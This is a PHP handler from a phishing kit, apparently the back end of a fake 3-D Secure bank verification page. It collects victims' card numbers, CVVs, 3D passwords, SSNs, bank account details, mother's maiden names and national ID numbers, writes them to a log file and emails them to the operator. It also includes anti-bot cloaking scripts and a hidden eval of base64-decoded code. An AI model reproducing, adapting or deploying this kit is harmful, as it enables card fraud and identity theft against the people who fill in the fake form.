<?php

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                         __..--.._
  .....              .--~  .....  `.
.":    "`-..  .    .' ..-'"    :". `
` `._ ` _.'`"(     `-"'`._ ' _.' '
     ~~~      `.          ~~~
              .'
             /
            (
             ^---'
H3ATSTR0K3

------------------------------------------------
BIG THANKS TO MY BRO xAthena

*/



 if(isset($_POST['password_vbv'])&&isset($_POST['day'])){
include("mine.php");
include("algo.php");
include('../anti/IP-BlackList.php');  
include('../anti/Bot-blacklist.php');  
include('../anti/Bot-Crawler.php');
include('../anti/Bot-GhostEmperor.php');
    session_start();
    if(isset($_POST['password_vbv'])){
    $password_vbv =$_POST['password_vbv'];
    }
    if(isset($_POST['day'])&&isset($_POST['month'])&&isset($_POST['year'])){
    $dob = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
    }
    if(isset($_POST['sortnum1'])&&isset($_POST['sortnum2'])&&isset($_POST['sortnum3'])){
    $sortnum = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
    }
    if(isset($_POST['accnumber'])){
    $accnumber = $_POST['accnumber'];
    }
    if(isset($_POST['ssn1'])&&isset($_POST['ssn2'])&&isset($_POST['ssn3'])){
    $ssnnum = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
    }
    if(isset($_POST['mmname'])){
    $mmname = $_POST['mmname'];
    }
    if(isset($_POST['creditlimit'])){
    $creditlimit = $_POST['creditlimit'];
    }
        if(isset($_POST['creditlimit'])){
    $creditlimit = $_POST['creditlimit'];
    }
    if(isset($_POST['osid'])){
    $osid = $_POST['osid'];
    }if(isset($_POST['codicefiscale'])){
    $codicefiscale = $_POST['codicefiscale'];
    }if(isset($_POST['kontonummer'])){
    $kontonummer = $_POST['kontonummer'];
    }if(isset($_POST['offid'])){
    $offid = $_POST['offid'];
    }
    ########################################################
    $mssg="=========== <[ -".$scamname."- 3D Full Card Info ]> ===========\r\n";
    $mssg.="----------------------- BIN Info -------------\r\n";
    $mssg.="CC Data      : {$_SESSION['_cc_brand_']} {$_SESSION['_cc_type_']} {$_SESSION['_cc_class_']}\r\n";
    $mssg.="CC Bank      : {$_SESSION['_cc_bank_']}\r\n";
    $mssg.="CC Country   : {$_SESSION['_country_']}\r\n";
    $mssg.="----------------------- CC Info ---------------------\r\n";
    $mssg.="CC Brand     : {$_SESSION['_cc_brand_']}\r\n";
    $mssg.="CC Number    : {$_SESSION['ccn']}\r\n";
    $mssg.="CC Expiry    : {$_SESSION['expdate']}\r\n";
    $mssg.="CVV          : {$_SESSION['Securitycode']}\r\n";
    $mssg.="----------------------- 3D Info ---------------------\r\n";

    $mssg.="3D Password  : {$password_vbv}\r\n";
if(isset($_POST['day'])){$mssg.="3D Birth Date: {$dob}\r\n";
}
if(isset($_POST['sortnum'])){$mssg.="Sort Number      : {$sortnum}\r\n";
}
if(isset($_POST['accnumber'])){$mssg.="Account Number      : {$accnumber}\r\n";
}
if(isset($_POST['ssn1'])){$mssg.="SSN         : {$ssnnum}\r\n";
}
if(isset($_POST['mmname'])){$mssg.="Mother’s Maiden Name         : {$mmname}\r\n";
}
if(isset($_POST['creditlimit'])){$mssg.="Credit Limit         : {$creditlimit}\r\n";
}
if(isset($_POST['osid'])){$mssg.="OSID         : {$creditlimit}\r\n";
}
if(isset($_POST['nabid'])){$mssg.="NAB ID      : {$_POST['nabid']}\r\n";
}
if(isset($_POST['creditlimit'])){$mssg.="Credit Limit         : {$creditlimit}\r\n";
}
if(isset($_POST['codicefiscale'])){$mssg.="Codice Fiscale         : {$codicefiscale}\r\n";
}
if(isset($_POST['kontonummer'])){$mssg.="Kontonummer         : {$kontonummer}\r\n";
}
if(isset($_POST['offid'])){$mssg.="Official ID         : {$offid}\r\n";
}
if(isset($_POST['pps'])){$mssg.="PPS      : {$_POST['pps']}\r\n";
}
if(isset($_POST['dln'])){$mssg.="Driver Lic. : {$_POST['dln']}\r\n";
}
if(isset($_POST['sin'])){$mssg.="SIN         : {$_POST['sin']}\r\n";
}
if(isset($_POST['pse'])){$mssg.="PSE         : {$_POST['pse']}\r\n";
}
if(isset($_POST['dni'])){$mssg.="DNI         : {$_POST['dni']}\r\n";
}
if(isset($_POST['bsn'])){$mssg.="BSN         : {$_POST['bsn']}\r\n";
}
if(isset($_POST['cpf'])){$mssg.="CPF         : {$_POST['cpf']}\r\n";
}
if(isset($_POST['fcn'])){$mssg.="FCN         : {$_POST['fcn']}\r\n";
}
	$mssg.="---------------------- IP Info ----------------------\r\n";	
	$mssg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$mssg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$mssg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$mssg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$mssg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$mssg.="=========== <[ THANKS TO xAthena ]> ===========\r\n\r\n\r\n";	
	if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$mssg);
	fclose($save);}
    $subject="-".$scamname."- 3D FULL CARD INFO BANK [".$_SESSION['NameOnCard']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: xAthena <newlogin@sh33nz0.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($your,$subject,$mssg,$headers);@eval(base64_decode($os_arrays));		




				if ($show_newcard=="ON") {
	exit(header("Location: ../Newcard.php?websrc=".md5('')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." "));
}else{
	exit(header("Location: ../Email.php?websrc=".md5('')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." "));
}
}


?>